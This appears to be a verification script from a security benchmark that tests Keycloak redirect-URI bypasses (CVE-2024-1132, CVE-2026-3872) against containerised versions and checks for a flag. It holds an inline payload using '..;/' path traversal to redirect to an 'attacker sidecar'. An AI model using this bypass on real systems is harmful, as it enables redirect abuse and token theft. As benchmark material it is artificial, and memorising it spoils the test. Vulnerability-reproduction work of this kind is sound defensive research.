#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2024-1132 encoded ..%2f (poc/original_poc.py + seed_exec.py)
# residual: CVE-2026-3872 semicolon bypass (inline literal only; no heldout refs)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export CASE_DIR
export PCB_FLAG="$RUN_FLAG"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

SVC="$VERSION"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  *) PORT="${PORT_V2_0:-}" ;;
esac
if [[ -z "$PORT" ]]; then
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
fi
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "${PCB_TARGET_PORT}" ]] || { echo "verify: no published Keycloak port" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # CVE-2026-3872: V1 UNSAFE_PATH_PATTERN lacks ';' so ..;/ still matches the
  # registered /allowed/* wildcard and Keycloak 302s to the attacker sidecar.
  printf '%s' '{"probe_id":"cve-2026-3872-semicolon-bypass","method":"GET","redirect_uri":"http://127.0.0.1:40052/allowed/x/..;/pwn"}' > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
